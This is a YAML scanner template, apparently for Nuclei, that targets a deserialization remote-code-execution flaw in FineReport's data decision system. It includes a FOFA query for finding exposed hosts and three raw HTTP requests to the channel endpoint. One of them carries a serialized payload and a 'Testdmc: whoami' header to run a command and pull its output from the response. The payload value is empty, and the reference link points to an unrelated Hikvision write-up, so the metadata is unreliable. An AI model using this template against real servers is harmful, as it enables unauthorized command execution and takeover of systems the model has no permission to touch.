id: finereport_data_decision_system_unserialize

info:
  name: finereport_data_decision_system_unserialize
  author: rootklt
  severity: high
  description: |
    帆软-数据决策系统channel接口存在反序列化，利用该漏洞可执行系统命令，获取系统控制权限。
  reference:
    - https://github.com/ibaiw/2023Hvv/blob/main/%E6%B5%B7%E5%BA%B7%E5%8D%AB%E8%A7%86%E5%89%8D%E5%8F%B0%E4%B8%8A%E4%BC%A0.md
  metadata:
    fofa-query: 'app="帆软-数据决策系统"'
    hunter-query: 
    verified: true
  tags: 2023,finereport,unserialize

variables:
  payload: '{{base64_decode("")}}'

requests: 
  - raw:
    - |
      GET /webroot/decision/remote/design/channel HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
      Accept-Encoding: gzip, deflate
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
      Connection: close
      Pragma: no-cache
      Cache-Control: no-cache
      Upgrade-Insecure-Requests: 1
      Accept-Language: zh-CN,zh;q=0.9

    - |
      POST /webroot/decision/remote/design/channel HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
      Accept-Encoding: gzip, deflate
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
      Connection: close
      Pragma: no-cache
      Cache-Control: no-cache
      Upgrade-Insecure-Requests: 1
      Accept-Language: zh-CN,zh;q=0.9
      Content-Length: 0

    - |
      @Timeout=15
      POST /webroot/decision/remote/design/channel HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
      Accept-Encoding: gzip, deflate
      Accept: */*
      Connection: close
      Content-Type: application/x-www-form-urlencoded
      Testdmc: whoami
      Testecho: TestEcho

      {{payload}}

    extractors:
      - type: kval
        part: header
        name: cmd_output
        internal: false
        kval:
          - Testdmc

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - "status_code_1==200 && status_code_3==200"
          - "contains((header_3), 'Testdmc')"
          - "len('{{cmd_output}}')>4"
        condition: and

        